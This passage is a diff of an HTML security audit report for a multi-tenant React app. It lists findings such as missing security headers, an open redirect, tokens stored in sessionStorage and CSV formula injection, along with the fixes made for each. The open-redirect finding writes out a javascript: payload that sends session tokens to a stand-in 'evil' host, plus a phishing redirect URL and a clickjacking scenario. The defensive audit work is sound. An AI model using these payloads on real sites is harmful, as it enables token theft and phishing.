-          <tr><td class="id">HYG-002</td><td>Low</td><td><span class="chip st st-fixed">Fixed</span></td><td>Divergent <span class="path">isAuthUrl</span> lists unified into new <span class="path">src/app/services/auth-urls.ts</span> (7-endpoint superset), imported by both <span class="path">recoveryApi.ts</span> and <span class="path">reauth.ts</span>. Duplicate page is still imported by <span class="path">TenantThemeBootstrap</span>, so it was <b>guarded</b> (RED-001) rather than deleted. <span class="path">recoveryApi.reauth.test.ts</span> passes; no new import cycle.</td></tr>
-          <tr><td class="id">TAB-001</td><td>Low</td><td><span class="chip st st-fixed">Fixed</span></td><td><span class="path">rel="noopener noreferrer"</span> added to the <span class="path">_blank</span> CSVLink in the landed-cost modal.</td></tr>
-          <tr><td class="id">THEME-001</td><td>Low</td><td><span class="chip st st-fixed">Fixed</span></td><td><span class="path">applyTenantTheme</span> now applies colors only if they match a strict hex pattern and the logo only if it is an <span class="path">https:</span> URL; malformed/hostile values are skipped (valid tenants unchanged).</td></tr>
-          <tr><td class="id">AC-001</td><td>Info</td><td><span class="chip st st-none">No action</span></td><td>By design — client "auth state" is cosmetic; the backend enforces every request. Documented for the pentest team.</td></tr>
-          <tr><td class="id">CFG-001</td><td>Info</td><td><span class="chip st st-partial">Partially fixed</span></td><td>The new CSP pins font origins to <span class="path">fonts.googleapis.com</span>/<span class="path">fonts.gstatic.com</span> rather than leaving them unconstrained. Self-hosting Lexend to drop the external origin entirely is deferred as a hardening follow-up.</td></tr>
-        </tbody>
-      </table>
+        <table class="remt">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Sev</th>
+              <th>Status</th>
+              <th>What changed &amp; how it was verified</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="id">HDR-001</td>
+              <td>High</td>
+              <td><span class="chip st st-fixed">Fixed*</span></td>
+              <td>
+                New <span class="path">customHttp.yml</span> — HSTS, X-Frame-Options DENY, nosniff,
+                Referrer-Policy, Permissions-Policy, and a strict CSP (<span class="path"
+                  >default-src 'self'; script-src 'self'; frame-ancestors 'none'</span
+                >; font/style origins pinned to Google Fonts). YAML validated; build green.
+                <b>*live headers pending preview deploy.</b>
+              </td>
+            </tr>
+            <tr>
+              <td class="id">RED-001</td>
+              <td>High</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                New <span class="path">src/lib/safe-redirect.ts</span>
+                <span class="path">isAllowedRedirectUrl</span> (https +
+                <span class="path">.tradeharmonizer.co.uk</span> suffix, http localhost only)
+                applied in both <span class="path">pages/auth/InvalidSubdomainPage.tsx</span> and
+                the duplicate <span class="path">components/tenant/InvalidSubdomainPage.tsx</span>.
+                11-case test proves <span class="path">javascript:</span>/<span class="path"
+                  >data:</span
+                >/foreign hosts fall back to the main site. Both sinks now use the sanitized value.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">SES-001</td>
+              <td>High</td>
+              <td><span class="chip st st-handoff">Backend handoff</span></td>
+              <td>
+                <b>Verified read-only:</b> the recovery auth module uses <b>no cookies at all</b> —
+                login and <span class="path">/recovery/auth/refresh</span> both carry tokens in the
+                request body. The frontend cannot move to HttpOnly cookies unilaterally. Kept the
+                tab-scoped + 12h-expiry sessionStorage envelope; the enforced CSP (HDR-001) is now
+                the compensating control. <b>Handoff:</b> backend must set an HttpOnly refresh
+                cookie on <span class="path">/recovery/auth/*</span>.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">INFO-001</td>
+              <td>Med</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                <span class="path">build</span> script now runs
+                <span class="path"
+                  >cross-env GENERATE_SOURCEMAP=false INLINE_RUNTIME_CHUNK=false craco build</span
+                >. Verified: post-build <span class="path">.map</span> count = <b>0</b> (was 4).
+              </td>
+            </tr>
+            <tr>
+              <td class="id">CSV-001</td>
+              <td>Med</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                <span class="path">neutralizeFormula</span> added to
+                <span class="path">src/lib/csv.ts</span> (prefixes
+                <span class="path">= + - @ \t \r</span> cells with <span class="path">'</span>) and
+                reused in the landed-cost export's <span class="path">csvData</span>. RFC-4180
+                quoting untouched. New <span class="path">csv.test.ts</span> covers formula +
+                quoting cases.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">API-001</td>
+              <td>Med</td>
+              <td><span class="chip st st-mitig">Already mitigated</span></td>
+              <td>
+                <b>Verified read-only:</b> the backend loads the record by id then
+                <span class="path">resolveDownloadTargetFromCombinedRecord</span> rejects any client
+                <span class="path">s3Key</span> not belonging to that record (<span class="path"
+                  >"Requested file key is not part of this recovery record"</span
+                >) and takes the bucket from the matched target. The
+                <span class="path">s3Key</span> selects which file — removing it would break
+                downloads, so the frontend is left unchanged.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">DEP-001</td>
+              <td>Med</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                <span class="path">npm audit fix</span> (non-breaking) resolved the 1 CRITICAL
+                (<span class="path">websocket-driver</span> 0.7.4→0.7.5); vulnerabilities 27→9.
+                Trivy now reports 0 CRITICAL. Residual 9 (moderate/high) are all dev/build-chain
+                (<span class="path">webpack-dev-server</span>/<span class="path">sockjs</span>/<span
+                  class="path"
+                  >uuid</span
+                >/<span class="path">react-scripts</span>), not shipped — accepted; durable fix =
+                migrate to Vite. <span class="path">--force</span> deliberately avoided.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">SUP-001</td>
+              <td>Med</td>
+              <td><span class="chip st st-fixed">Fixed*</span></td>
+              <td>
+                <span class="path">amplify.yml</span>: Trivy installer pinned to
+                <span class="path">v0.71.1</span> (was mutable <span class="path">main</span>; URL
+                verified 200 and matches the locally validated version) + non-blocking
+                <span class="path">npm run security:audit</span> and
+                <span class="path">trivy fs</span> scan steps added to the build phase. YAML
+                validated. <b>*pipeline behavior pending Amplify build.</b>
+              </td>
+            </tr>
+            <tr>
+              <td class="id">SES-002</td>
+              <td>Low</td>
+              <td><span class="chip st st-defer">Deferred · handoff</span></td>
+              <td>
+                <b>Verified:</b> backend <span class="path">setup-password</span> requires the raw
+                <span class="path">temporaryPassword</span> (re-validated vs the stored hash)
+                alongside the setup token, and the multi-step OTP flow persists it to sessionStorage
+                to survive page reloads. Navigation-state-only would break reload resilience. Left
+                as-is to avoid breaking onboarding; <b>handoff:</b> backend should accept the setup
+                token alone at setup-password.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">UPLOAD-001</td>
+              <td>Low</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                <span class="path">upload-c88-document-modal.tsx</span>: fail-fast 10 MB size
+                ceiling + <span class="path">%PDF-</span> magic-byte check before the mutation
+                (backend remains authoritative). Mutation contract unchanged.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">HYG-001</td>
+              <td>Low</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                Grep-confirmed zero importers, then deleted
+                <span class="path">src/config/auth.ts</span> (hardcoded demo creds). Typecheck +
+                build clean with it gone.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">HYG-002</td>
+              <td>Low</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                Divergent <span class="path">isAuthUrl</span> lists unified into new
+                <span class="path">src/app/services/auth-urls.ts</span> (7-endpoint superset),
+                imported by both <span class="path">recoveryApi.ts</span> and
+                <span class="path">reauth.ts</span>. Duplicate page is still imported by
+                <span class="path">TenantThemeBootstrap</span>, so it was <b>guarded</b> (RED-001)
+                rather than deleted. <span class="path">recoveryApi.reauth.test.ts</span> passes; no
+                new import cycle.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">TAB-001</td>
+              <td>Low</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                <span class="path">rel="noopener noreferrer"</span> added to the
+                <span class="path">_blank</span> CSVLink in the landed-cost modal.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">THEME-001</td>
+              <td>Low</td>
+              <td><span class="chip st st-fixed">Fixed</span></td>
+              <td>
+                <span class="path">applyTenantTheme</span> now applies colors only if they match a
+                strict hex pattern and the logo only if it is an
+                <span class="path">https:</span> URL; malformed/hostile values are skipped (valid
+                tenants unchanged).
+              </td>
+            </tr>
+            <tr>
+              <td class="id">AC-001</td>
+              <td>Info</td>
+              <td><span class="chip st st-none">No action</span></td>
+              <td>
+                By design — client "auth state" is cosmetic; the backend enforces every request.
+                Documented for the pentest team.
+              </td>
+            </tr>
+            <tr>
+              <td class="id">CFG-001</td>
+              <td>Info</td>
+              <td><span class="chip st st-partial">Partially fixed</span></td>
+              <td>
+                The new CSP pins font origins to
+                <span class="path">fonts.googleapis.com</span>/<span class="path"
+                  >fonts.gstatic.com</span
+                >
+                rather than leaving them unconstrained. Self-hosting Lexend to drop the external
+                origin entirely is deferred as a hardening follow-up.
+              </td>
+            </tr>
+          </tbody>
+        </table>
       </div>
     </div>
   </section>
@@ -288,18 +907,27 @@
   <section>
     <h2 class="sh"><span class="idx">01</span>Executive Summary</h2>
     <div class="card">
-      <p class="lead">RECOVERY is a multi-tenant, subdomain-routed React SPA whose only backend is the shared
-      NestJS API. It has a small, well-contained attack surface: a single RTK Query network layer with a 401
-      refresh-and-retry flow, no admin UI, no client-rendered HTML, and no third-party embed points. A prior
-      hardening pass (this is the <span class="path">security-improvements</span> branch) already eliminated the
-      most severe class of issues that afflicted the trade-harmonizer baseline.</p>
-      <p class="lead" style="margin-bottom:0">What remains are <b>edge-hardening gaps</b> rather than logic flaws.
-      The application ships <b>no HTTP security headers and no Content-Security-Policy</b> — the single biggest
-      weakness, leaving it open to clickjacking and removing all defense-in-depth against script injection. It
-      contains a <b>client-side open redirect</b> reachable via a URL parameter, keeps <b>access and refresh
-      tokens in JavaScript-readable <span class="path">sessionStorage</span></b>, and <b>serves production source
-      maps</b>. The remainder are dependency hygiene, CSV export encoding, and dead-code items. None require backend
-      changes; all are frontend-owned and fixable independently.</p>
+      <p class="lead">
+        RECOVERY is a multi-tenant, subdomain-routed React SPA whose only backend is the shared
+        NestJS API. It has a small, well-contained attack surface: a single RTK Query network layer
+        with a 401 refresh-and-retry flow, no admin UI, no client-rendered HTML, and no third-party
+        embed points. A prior hardening pass (this is the
+        <span class="path">security-improvements</span> branch) already eliminated the most severe
+        class of issues that afflicted the trade-harmonizer baseline.
+      </p>
+      <p class="lead" style="margin-bottom: 0">
+        What remains are <b>edge-hardening gaps</b> rather than logic flaws. The application ships
+        <b>no HTTP security headers and no Content-Security-Policy</b> — the single biggest
+        weakness, leaving it open to clickjacking and removing all defense-in-depth against script
+        injection. It contains a <b>client-side open redirect</b> reachable via a URL parameter,
+        keeps
+        <b
+          >access and refresh tokens in JavaScript-readable
+          <span class="path">sessionStorage</span></b
+        >, and <b>serves production source maps</b>. The remainder are dependency hygiene, CSV
+        export encoding, and dead-code items. None require backend changes; all are frontend-owned
+        and fixable independently.
+      </p>
     </div>
   </section>
 
@@ -307,15 +935,51 @@
   <section>
     <h2 class="sh"><span class="idx">02</span>Security Score by Domain</h2>
     <div class="card">
-      <div class="cat"><div class="name">Authentication</div><div class="bar"><i style="width:82%;background:var(--good)"></i></div><div class="pct">82</div></div>
-      <div class="cat"><div class="name">Authorization / Access Control</div><div class="bar"><i style="width:75%;background:#4d9a5a"></i></div><div class="pct">75</div></div>
-      <div class="cat"><div class="name">Session &amp; Token Management</div><div class="bar"><i style="width:68%;background:var(--med)"></i></div><div class="pct">68</div></div>
-      <div class="cat"><div class="name">Browser / HTTP Header Security</div><div class="bar"><i style="width:45%;background:var(--high)"></i></div><div class="pct">45</div></div>
-      <div class="cat"><div class="name">Input Validation / Output Encoding</div><div class="bar"><i style="width:74%;background:#4d9a5a"></i></div><div class="pct">74</div></div>
-      <div class="cat"><div class="name">API Consumption</div><div class="bar"><i style="width:78%;background:#4d9a5a"></i></div><div class="pct">78</div></div>
-      <div class="cat"><div class="name">Information Disclosure</div><div class="bar"><i style="width:63%;background:var(--med)"></i></div><div class="pct">63</div></div>
-      <div class="cat"><div class="name">Dependency Security</div><div class="bar"><i style="width:60%;background:var(--med)"></i></div><div class="pct">60</div></div>
-      <div class="cat"><div class="name">Configuration &amp; Supply Chain</div><div class="bar"><i style="width:58%;background:var(--med)"></i></div><div class="pct">58</div></div>
+      <div class="cat">
+        <div class="name">Authentication</div>
+        <div class="bar"><i style="width: 82%; background: var(--good)"></i></div>
+        <div class="pct">82</div>
+      </div>
+      <div class="cat">
+        <div class="name">Authorization / Access Control</div>
+        <div class="bar"><i style="width: 75%; background: #4d9a5a"></i></div>
+        <div class="pct">75</div>
+      </div>
+      <div class="cat">
+        <div class="name">Session &amp; Token Management</div>
+        <div class="bar"><i style="width: 68%; background: var(--med)"></i></div>
+        <div class="pct">68</div>
+      </div>
+      <div class="cat">
+        <div class="name">Browser / HTTP Header Security</div>
+        <div class="bar"><i style="width: 45%; background: var(--high)"></i></div>
+        <div class="pct">45</div>
+      </div>
+      <div class="cat">
+        <div class="name">Input Validation / Output Encoding</div>
+        <div class="bar"><i style="width: 74%; background: #4d9a5a"></i></div>
+        <div class="pct">74</div>
+      </div>
+      <div class="cat">
+        <div class="name">API Consumption</div>
+        <div class="bar"><i style="width: 78%; background: #4d9a5a"></i></div>
+        <div class="pct">78</div>
+      </div>
+      <div class="cat">
+        <div class="name">Information Disclosure</div>
+        <div class="bar"><i style="width: 63%; background: var(--med)"></i></div>
+        <div class="pct">63</div>
+      </div>
+      <div class="cat">
+        <div class="name">Dependency Security</div>
+        <div class="bar"><i style="width: 60%; background: var(--med)"></i></div>
+        <div class="pct">60</div>
+      </div>
+      <div class="cat">
+        <div class="name">Configuration &amp; Supply Chain</div>
+        <div class="bar"><i style="width: 58%; background: var(--med)"></i></div>
+        <div class="pct">58</div>
+      </div>
     </div>
   </section>
 
@@ -325,18 +989,88 @@
     <div class="card heat-wrap">
       <table class="heat">
         <thead>
-          <tr><th class="mod" style="text-align:left">Module</th><th>Critical</th><th>High</th><th>Medium</th><th>Low</th><th>Info</th></tr>
+          <tr>
+            <th class="mod" style="text-align: left">Module</th>
+            <th>Critical</th>
+            <th>High</th>
+            <th>Medium</th>
+            <th>Low</th>
+            <th>Info</th>
+          </tr>
         </thead>
         <tbody>
-          <tr><td class="mod">Configuration / Hosting</td><td></td><td><span class="cellv" style="background:var(--high)">1</span></td><td><span class="cellv" style="background:var(--med)">1</span></td><td></td><td><span class="cellv" style="background:var(--info)">1</span></td></tr>
-          <tr><td class="mod">Session / Token Mgmt</td><td></td><td><span class="cellv" style="background:var(--high)">1</span></td><td></td><td><span class="cellv" style="background:var(--low)">1</span></td><td></td></tr>
-          <tr><td class="mod">Routing / Redirects</td><td></td><td><span class="cellv" style="background:var(--high)">1</span></td><td></td><td></td><td></td></tr>
-          <tr><td class="mod">Build / Info Disclosure</td><td></td><td></td><td><span class="cellv" style="background:var(--med)">1</span></td><td></td><td></td></tr>
-          <tr><td class="mod">Dependencies / Supply Chain</td><td></td><td></td><td><span class="cellv" style="background:var(--med)">2</span></td><td></td><td></td></tr>
-          <tr><td class="mod">Shipments / Export &amp; API</td><td></td><td></td><td><span class="cellv" style="background:var(--med)">1</span></td><td><span class="cellv" style="background:var(--low)">1</span></td><td></td></tr>
-          <tr><td class="mod">Inbox / Downloads</td><td></td><td></td><td><span class="cellv" style="background:var(--med)">1</span></td><td></td><td></td></tr>
-          <tr><td class="mod">File Upload</td><td></td><td></td><td></td><td><span class="cellv" style="background:var(--low)">1</span></td><td></td></tr>
-          <tr><td class="mod">Auth / Hygiene / Theme</td><td></td><td></td><td></td><td><span class="cellv" style="background:var(--low)">3</span></td><td><span class="cellv" style="background:var(--info)">2</span></td></tr>
+          <tr>
+            <td class="mod">Configuration / Hosting</td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--high)">1</span></td>
+            <td><span class="cellv" style="background: var(--med)">1</span></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--info)">1</span></td>
+          </tr>
+          <tr>
+            <td class="mod">Session / Token Mgmt</td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--high)">1</span></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--low)">1</span></td>
+            <td></td>
+          </tr>
+          <tr>
+            <td class="mod">Routing / Redirects</td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--high)">1</span></td>
+            <td></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <td class="mod">Build / Info Disclosure</td>
+            <td></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--med)">1</span></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <td class="mod">Dependencies / Supply Chain</td>
+            <td></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--med)">2</span></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <td class="mod">Shipments / Export &amp; API</td>
+            <td></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--med)">1</span></td>
+            <td><span class="cellv" style="background: var(--low)">1</span></td>
+            <td></td>
+          </tr>
+          <tr>
+            <td class="mod">Inbox / Downloads</td>
+            <td></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--med)">1</span></td>
+            <td></td>
+            <td></td>
+          </tr>
+          <tr>
+            <td class="mod">File Upload</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--low)">1</span></td>
+            <td></td>
+          </tr>
+          <tr>
+            <td class="mod">Auth / Hygiene / Theme</td>
+            <td></td>
+            <td></td>
+            <td></td>
+            <td><span class="cellv" style="background: var(--low)">3</span></td>
+            <td><span class="cellv" style="background: var(--info)">2</span></td>
+          </tr>
         </tbody>
       </table>
     </div>
@@ -348,19 +1082,66 @@
 
     <!-- HDR-001 -->
     <div class="finding high">
-      <div class="fhead"><span class="fid">HDR-001</span><span class="chip st st-fixed">Fixed*</span><span class="chip high"><span class="dot" style="background:var(--high)"></span>High</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Configuration · CSP · Clickjacking</span></div>
-      <div class="ftitle">No HTTP security headers and no Content-Security-Policy are delivered</div>
+      <div class="fhead">
+        <span class="fid">HDR-001</span><span class="chip st st-fixed">Fixed*</span
+        ><span class="chip high"><span class="dot" style="background: var(--high)"></span>High</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Configuration · CSP · Clickjacking</span
+        >
+      </div>
+      <div class="ftitle">
+        No HTTP security headers and no Content-Security-Policy are delivered
+      </div>
       <div class="fmeta">
         <span class="tag">Module: <b>Configuration / Hosting</b></span>
-        <span class="tag">File: <span class="path">public/index.html</span>, <span class="path">amplify.yml</span></span>
+        <span class="tag"
+          >File: <span class="path">public/index.html</span>,
+          <span class="path">amplify.yml</span></span
+        >
         <span class="tag">Confidence: <b>High</b></span>
         <span class="tag">Priority: <b>Immediate</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p>The app is a static CRA bundle served by AWS Amplify. There is no <span class="path">customHttp.yml</span>, no headers block in <span class="path">amplify.yml</span>, and no <span class="path">&lt;meta http-equiv&gt;</span> CSP in <span class="path">public/index.html</span>. As a result the production site ships <b>no</b> Content-Security-Policy, X-Frame-Options / frame-ancestors, HSTS, X-Content-Type-Options, Referrer-Policy, or Permissions-Policy.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>With no <span class="path">frame-ancestors</span>/X-Frame-Options the login and dashboard can be framed → clickjacking / UI-redress against authenticated actions (e.g. account-deletion request). With no CSP there is zero defense-in-depth: any injected script (see RED-001, or a future DOM sink) runs unrestricted and can exfiltrate the sessionStorage tokens (SES-001). No HSTS permits SSL-strip downgrade on first contact; no nosniff allows MIME-confusion on served attachments.</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p>An attacker hosts <span class="path">&lt;iframe src="https://acme.recovery.tradeharmonizer.co.uk/settings"&gt;</span> with an invisible overlay, tricking a logged-in user into clicking "Request account deletion". Separately, if any script executes on-origin, <span class="path">JSON.parse(sessionStorage.recovery_platform_auth_v2)</span> yields the live access + refresh tokens with no CSP to block the outbound beacon.</p></div>
-      <div class="frow"><div class="lbl">Evidence</div>
-        <pre class="code"><span class="cm"># amplify.yml — no `customHeaders:` / customHttp.yml present</span>
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          The app is a static CRA bundle served by AWS Amplify. There is no
+          <span class="path">customHttp.yml</span>, no headers block in
+          <span class="path">amplify.yml</span>, and no
+          <span class="path">&lt;meta http-equiv&gt;</span> CSP in
+          <span class="path">public/index.html</span>. As a result the production site ships
+          <b>no</b> Content-Security-Policy, X-Frame-Options / frame-ancestors, HSTS,
+          X-Content-Type-Options, Referrer-Policy, or Permissions-Policy.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          With no <span class="path">frame-ancestors</span>/X-Frame-Options the login and dashboard
+          can be framed → clickjacking / UI-redress against authenticated actions (e.g.
+          account-deletion request). With no CSP there is zero defense-in-depth: any injected script
+          (see RED-001, or a future DOM sink) runs unrestricted and can exfiltrate the
+          sessionStorage tokens (SES-001). No HSTS permits SSL-strip downgrade on first contact; no
+          nosniff allows MIME-confusion on served attachments.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          An attacker hosts
+          <span class="path"
+            >&lt;iframe src="https://acme.recovery.tradeharmonizer.co.uk/settings"&gt;</span
+          >
+          with an invisible overlay, tricking a logged-in user into clicking "Request account
+          deletion". Separately, if any script executes on-origin,
+          <span class="path">JSON.parse(sessionStorage.recovery_platform_auth_v2)</span> yields the
+          live access + refresh tokens with no CSP to block the outbound beacon.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
+        <pre
+          class="code"
+        ><span class="cm"># amplify.yml — no `customHeaders:` / customHttp.yml present</span>
 frontend:
   artifacts:
     baseDirectory: build
@@ -368,27 +1149,90 @@ frontend:
 &lt;link href="https://fonts.googleapis.com/css2?family=Lexend..." rel="stylesheet" /&gt;</pre>
       </div>
       <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A05:2021 Security Misconfiguration · OWASP Secure Headers Project · ASV V14.4</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.9 Configuration Management · A.8.26 Application security requirements</p></div>
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>A05:2021 Security Misconfiguration · OWASP Secure Headers Project · ASV V14.4</p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>A.8.9 Configuration Management · A.8.26 Application security requirements</p>
+        </div>
       </div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Add an Amplify <span class="path">customHttp.yml</span> (or Console custom headers) delivering a strict CSP (<span class="path">default-src 'self'</span>; self-host the Lexend font to drop the Google Fonts origin), <span class="path">frame-ancestors 'none'</span>, <span class="path">Strict-Transport-Security</span>, <span class="path">X-Content-Type-Options: nosniff</span>, <span class="path">Referrer-Policy: strict-origin-when-cross-origin</span>, and a minimal <span class="path">Permissions-Policy</span>. Mirror the header set already present in trade-harmonizer's <span class="path">next.config.ts</span>.</p></div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Add an Amplify <span class="path">customHttp.yml</span> (or Console custom headers)
+          delivering a strict CSP (<span class="path">default-src 'self'</span>; self-host the
+          Lexend font to drop the Google Fonts origin),
+          <span class="path">frame-ancestors 'none'</span>,
+          <span class="path">Strict-Transport-Security</span>,
+          <span class="path">X-Content-Type-Options: nosniff</span>,
+          <span class="path">Referrer-Policy: strict-origin-when-cross-origin</span>, and a minimal
+          <span class="path">Permissions-Policy</span>. Mirror the header set already present in
+          trade-harmonizer's <span class="path">next.config.ts</span>.
+        </p>
+      </div>
     </div>
 
     <!-- RED-001 -->
     <div class="finding high">
-      <div class="fhead"><span class="fid">RED-001</span><span class="chip st st-fixed">Fixed</span><span class="chip high"><span class="dot" style="background:var(--high)"></span>High</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Open Redirect · DOM-XSS</span></div>
-      <div class="ftitle">Unvalidated <code>redirectUrl</code> query param drives navigation and an anchor href</div>
+      <div class="fhead">
+        <span class="fid">RED-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip high"><span class="dot" style="background: var(--high)"></span>High</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Open Redirect · DOM-XSS</span
+        >
+      </div>
+      <div class="ftitle">
+        Unvalidated <code>redirectUrl</code> query param drives navigation and an anchor href
+      </div>
       <div class="fmeta">
         <span class="tag">Module: <b>Routing / Redirects</b></span>
-        <span class="tag">File: <span class="path">src/pages/auth/InvalidSubdomainPage.tsx</span></span>
+        <span class="tag"
+          >File: <span class="path">src/pages/auth/InvalidSubdomainPage.tsx</span></span
+        >
         <span class="tag">Fn: <b>InvalidSubdomainPage</b></span>
         <span class="tag">Confidence: <b>High</b></span>
         <span class="tag">Priority: <b>Immediate</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p>The page reads <span class="path">redirectUrl</span> directly from the URL query string and, after a 600&nbsp;ms timer, performs <span class="path">window.location.replace(redirectUrl)</span>. The same untrusted value is rendered as the <span class="path">href</span> of the "Go to main site" link. There is no scheme or host allowlist. The duplicate copy at <span class="path">src/components/tenant/InvalidSubdomainPage.tsx</span> behaves identically via <span class="path">window.location.href</span>.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>Any tenant/host that reaches this route can be sent an attacker-chosen destination — a classic open redirect used to launder phishing links behind the trusted brand domain. Because the value is also placed straight into an anchor <span class="path">href</span>, a <span class="path">javascript:</span> URI (e.g. <span class="path">?redirectUrl=javascript:fetch('//evil/'+sessionStorage.recovery_platform_auth_v2)</span>) executes as DOM-based XSS when the user clicks the button — and with no CSP (HDR-001) nothing stops it.</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p>Phishing email: <span class="path">https://acme.recovery.tradeharmonizer.co.uk/invalid-subdomain?redirectUrl=https://acme-recovery-login.com</span>. The victim trusts the real domain in the link, lands on the branded page, and is auto-forwarded to the credential-harvesting clone. A crafted <span class="path">javascript:</span> value escalates the same entry point to token theft.</p></div>
-      <div class="frow"><div class="lbl">Evidence</div>
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          The page reads <span class="path">redirectUrl</span> directly from the URL query string
+          and, after a 600&nbsp;ms timer, performs
+          <span class="path">window.location.replace(redirectUrl)</span>. The same untrusted value
+          is rendered as the <span class="path">href</span> of the "Go to main site" link. There is
+          no scheme or host allowlist. The duplicate copy at
+          <span class="path">src/components/tenant/InvalidSubdomainPage.tsx</span> behaves
+          identically via <span class="path">window.location.href</span>.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          Any tenant/host that reaches this route can be sent an attacker-chosen destination — a
+          classic open redirect used to launder phishing links behind the trusted brand domain.
+          Because the value is also placed straight into an anchor <span class="path">href</span>, a
+          <span class="path">javascript:</span> URI (e.g.
+          <span class="path"
+            >?redirectUrl=javascript:fetch('//evil/'+sessionStorage.recovery_platform_auth_v2)</span
+          >) executes as DOM-based XSS when the user clicks the button — and with no CSP (HDR-001)
+          nothing stops it.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          Phishing email:
+          <span class="path"
+            >https://acme.recovery.tradeharmonizer.co.uk/invalid-subdomain?redirectUrl=https://acme-recovery-login.com</span
+          >. The victim trusts the real domain in the link, lands on the branded page, and is
+          auto-forwarded to the credential-harvesting clone. A crafted
+          <span class="path">javascript:</span> value escalates the same entry point to token theft.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
         <pre class="code">const redirectUrl = searchParams.get('redirectUrl') || env.mainSiteUrl
 useEffect(() =&gt; {
   const timer = window.setTimeout(() =&gt; {
@@ -399,16 +1243,42 @@ useEffect(() =&gt; {
 &lt;a href={redirectUrl}&gt;{t('auth.invalidSubdomain.goToMainSite')}&lt;/a&gt;  <span class="cm">// javascript: sink</span></pre>
       </div>
       <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A01:2021 Broken Access Control (Unvalidated Redirects &amp; Forwards) · A03:2021 Injection (DOM-XSS) · ASVS V5.1.5</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.26 Application security requirements · A.8.28 Secure coding</p></div>
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>
+            A01:2021 Broken Access Control (Unvalidated Redirects &amp; Forwards) · A03:2021
+            Injection (DOM-XSS) · ASVS V5.1.5
+          </p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>A.8.26 Application security requirements · A.8.28 Secure coding</p>
+        </div>
       </div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Allowlist the redirect target: accept only <span class="path">https:</span> URLs whose hostname equals or ends with <span class="path">.tradeharmonizer.co.uk</span> (plus localhost in dev); otherwise fall back to <span class="path">env.mainSiteUrl</span>. Apply the check before both the navigation and the anchor href, and delete the duplicate component copy (see HYG-002).</p></div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Allowlist the redirect target: accept only <span class="path">https:</span> URLs whose
+          hostname equals or ends with <span class="path">.tradeharmonizer.co.uk</span> (plus
+          localhost in dev); otherwise fall back to <span class="path">env.mainSiteUrl</span>. Apply
+          the check before both the navigation and the anchor href, and delete the duplicate
+          component copy (see HYG-002).
+        </p>
+      </div>
     </div>
 
     <!-- SES-001 -->
     <div class="finding high">
